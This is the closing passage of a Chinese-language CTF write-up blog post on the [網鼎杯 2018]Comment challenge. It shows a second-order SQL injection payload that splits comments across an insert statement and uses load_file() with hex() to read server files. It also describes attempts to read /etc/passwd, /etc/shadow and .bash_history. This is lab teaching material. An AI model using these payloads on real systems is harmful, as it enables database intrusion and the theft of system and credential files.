<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=payload/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="string">&quot;insert into comment set category = &#x27;&#x27;,content=payload/**/#&quot;</span></span><br></pre></td></tr></table></figure>

<p>一開始我是想直接找到使用者密碼的，嘗試讀取 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 未果之後，我又長了新知識。根據 <code>/etc/passwd</code> 下的提示 ，www 使用者可以使用 bash，於是查詢該使用者的 <code>.bash_history</code> 找到了線索，讀取 <code>/tmp/html/.DS_Store</code>。這裡還有個要點，因為檔案太長了，使用 <code>load_file()</code> 讀取的時候可能顯示不完整，所以就用 <code>hex()</code> 轉換一下，構造 <code>&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code>，解碼之後找到了線索 <code>flag_ 8946e1ff1ee3e40f.php</code>。按照一樣的套路讀取這個檔案可以讀取到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bcd19c68-e4eb-43d7-845a-7a51bce22828&#125;</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首頁</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">關於</a></li>
         
          <li><a href="/search/">搜尋</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AD%B7%E7%B6%B2%E6%9D%AF-2018-easy-tornado"><span class="toc-number">1.</span> <span class="toc-text">[護網杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B7%E7%B6%B2%E6%9D%AF-2019-%E9%9A%A8%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">[強網杯 2019]隨便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">4.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">5.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">6.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E8%8F%AF%E5%8C%97%E8%B3%BD%E5%8D%80-Day2-Web1-Hack-World"><span class="toc-number">8.</span> <span class="toc-text">[CISCN2019 華北賽區 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B6%B2%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">9.</span> <span class="toc-text">[網鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">10.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">11.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">12.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B3%BD-Include"><span class="toc-number">13.</span> <span class="toc-text">[ACTF2020 新生賽]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B3%BD-Exec"><span class="toc-number">14.</span> <span class="toc-text">[ACTF2020 新生賽]Exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">15.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">16.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B3%BD-BackupFile"><span class="toc-number">17.</span> <span class="toc-text">[ACTF2020 新生賽]BackupFile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E6%A8%B8%E5%AF%A6%E7%84%A1%E8%8F%AF"><span class="toc-number">18.</span> <span class="toc-text">[WUSTCTF2020]樸實無華</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E9%A1%8F%E5%80%BC%E6%88%90%E7%B8%BE%E6%9F%A5%E8%A9%A2"><span class="toc-number">19.</span> <span class="toc-text">[WUSTCTF2020]顏值成績查詢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E8%8F%AF%E6%9D%B1%E5%8D%97%E8%B3%BD%E5%8D%80-Web11"><span class="toc-number">20.</span> <span class="toc-text">[CISCN2019 華東南賽區]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">21.</span> <span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">22.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B6%B2%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">23.</span> <span class="toc-text">[網鼎杯 2018]Comment</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&text=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&is_video=false&description=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BUUOJ Web 一分題 WriteUp 合集&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&name=BUUOJ Web 一分題 WriteUp 合集&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&t=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/zh-TW/">首頁</a></li>
         
          <li><a href="/zh-TW/archives/">文章</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">關於</a></li>
         
          <li><a href="/search/">搜尋</a></li>
        
        
        
        <li>
        
          <a href="/zh-CN">简</a>
        
          <a href="/en">En</a>
        
          <a href="#">正</a>
        
        </li>
      </ul>
    </nav>
  </div>
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2021
    LemonPrefect
    
      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
    
    
      <img no-lazy src="/images/beian.png"/>
      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
    
    
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.8/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


<script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 2,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
</html>
